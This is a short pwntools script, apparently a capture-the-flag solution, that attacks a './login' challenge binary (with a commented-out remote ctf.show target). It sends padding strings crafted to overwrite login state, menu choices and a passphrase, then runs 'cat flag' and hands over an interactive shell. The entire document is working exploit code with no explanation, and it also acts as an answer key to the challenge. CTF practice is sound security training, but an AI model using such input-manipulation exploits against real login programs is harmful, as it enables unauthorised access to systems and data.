from pwn import *

p = process('./login')
# p = remote('pwn.challenge.ctf.show', 28105)
p.sendline(b'l')
p.sendline(b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')
p.sendline(b'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbtaw')
p.sendline(b'n')
p.sendline(b'Fool Jazz Mingus Hat')
sleep(1)
p.sendline(b'cat flag')
p.interactive()
